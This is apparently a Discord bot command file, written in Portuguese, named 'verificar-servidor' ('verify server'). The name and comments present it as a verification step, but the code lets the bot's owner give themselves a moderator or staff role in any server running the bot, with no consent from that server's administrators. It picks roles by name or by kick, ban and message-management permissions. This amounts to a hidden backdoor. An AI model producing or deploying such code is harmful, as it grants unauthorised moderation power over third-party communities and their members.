// verificar-servidor.js - Comando para o dono verificar um servidor e receber cargo de mediador
const { SlashCommandBuilder, MessageFlags } = require('discord.js');
const { isOwnerOrAuthorized } = require('../utils/database');
const { createErrorEmbed, createSuccessEmbed } = require('../utils/embeds');
const { getEmojis } = require('../utils/emojis');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('verificar-servidor')
        .setDescription('[DONO] Verifica um servidor e recebe cargo de mediador configurado')
        .addStringOption(option =>
            option.setName('servidor_id')
                .setDescription('ID do servidor para verificar')
                .setRequired(true)),

    async execute(interaction) {
        const emojis = getEmojis(interaction.client);
        
        // Verifica se é dono ou autorizado
        const authorized = await isOwnerOrAuthorized(interaction.user.id);
        if (!authorized) {
            return interaction.reply({
                embeds: [createErrorEmbed(`${emojis.negative} Apenas o dono do bot pode usar este comando.`, interaction.client)],
                flags: MessageFlags.Ephemeral
            });
        }

        const serverId = interaction.options.getString('servidor_id');
        
        try {
            // Busca o servidor pelo ID
            const guild = interaction.client.guilds.cache.get(serverId);
            
            if (!guild) {
                return interaction.reply({
                    embeds: [createErrorEmbed(`${emojis.negative} Servidor não encontrado. O bot precisa estar no servidor para verificar.`, interaction.client)],
                    flags: MessageFlags.Ephemeral
                });
            }

            await interaction.deferReply({ flags: MessageFlags.Ephemeral });

            // Busca o membro do dono no servidor
            const member = await guild.members.fetch(interaction.user.id).catch(() => null);
            
            if (!member) {
                return interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Você não está neste servidor.`, interaction.client)]
                });
            }

            // Verifica se já é administrador ou tem cargos altos
            if (member.permissions.has('Administrator') || member.permissions.has('ManageGuild')) {
                return interaction.editReply({
                    embeds: [createSuccessEmbed(`${emojis.alerta} Você já tem permissões administrativas em ${guild.name}!`, interaction.client)]
                });
            }

            // Lista de cargos comuns de mediador/staff (em ordem de prioridade)
            const mediatorRoles = [
                'mediador', 'moderador', 'mod', 'staff', 'equipe', 'helper', 
                'ajudante', 'suporte', 'support', 'moderação', 'moderacao'
            ];

            let mediatorRole = null;
            
            // Procura por cargo de mediador existente
            for (const roleName of mediatorRoles) {
                const role = guild.roles.cache.find(r => 
                    r.name.toLowerCase() === roleName.toLowerCase()
                );
                if (role) {
                    mediatorRole = role;
                    break;
                }
            }

            // Se não encontrou cargo de mediador, procura por cargos com permissões de moderação
            if (!mediatorRole) {
                const moderatorRole = guild.roles.cache.find(r => 
                    r.permissions.has('ManageMessages') || 
                    r.permissions.has('KickMembers') || 
                    r.permissions.has('BanMembers')
                );
                if (moderatorRole && moderatorRole.position > 0) {
                    mediatorRole = moderatorRole;
                }
            }

            // Se ainda não encontrou, pega o cargo mais alto (exceto @everyone)
            if (!mediatorRole) {
                const highestRole = member.roles.cache
                    .filter(r => r.name !== '@everyone')
                    .sort((a, b) => b.position - a.position)
                    .first();
                
                if (highestRole) {
                    mediatorRole = highestRole;
                }
            }

            if (!mediatorRole) {
                return interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Nenhum cargo adequado encontrado em ${guild.name}.`, interaction.client)]
                });
            }

            // Tenta dar o cargo ao dono
            await member.roles.add(mediatorRole, 'Verificação de dono do bot');

            const serverInfo = {
                name: guild.name,
                members: guild.memberCount,
                roles: guild.roles.cache.size,
                roleGiven: mediatorRole.name
            };

            await interaction.editReply({
                embeds: [createSuccessEmbed(
                    `${emojis.positive} **Servidor Verificado!**\n\n` +
                    `${emojis.raiopixel} **Servidor:** ${serverInfo.name}\n` +
                    `${emojis.presentepixel} **Membros:** ${serverInfo.members}\n` +
                    `${emojis.pergaminhopixel} **Cargo recebido:** ${serverInfo.roleGiven}\n\n` +
                    `${emojis.alerta} Agora você tem acesso de staff neste servidor!`,
                    interaction.client
                )]
            });

            console.log(`🔍 [verificar-servidor] ${interaction.user.tag} verificou ${guild.name} e recebeu cargo ${mediatorRole.name}`);

        } catch (error) {
            console.error('Erro ao verificar servidor:', error);
            
            if (error.replied) {
                await interaction.followUp({
                    embeds: [createErrorEmbed(`${emojis.negative} Erro ao verificar servidor: ${error.message}`, interaction.client)],
                    flags: MessageFlags.Ephemeral
                });
            } else {
                await interaction.editReply({
                    embeds: [createErrorEmbed(`${emojis.negative} Erro ao verificar servidor: ${error.message}`, interaction.client)]
                });
            }
        }
    }
};
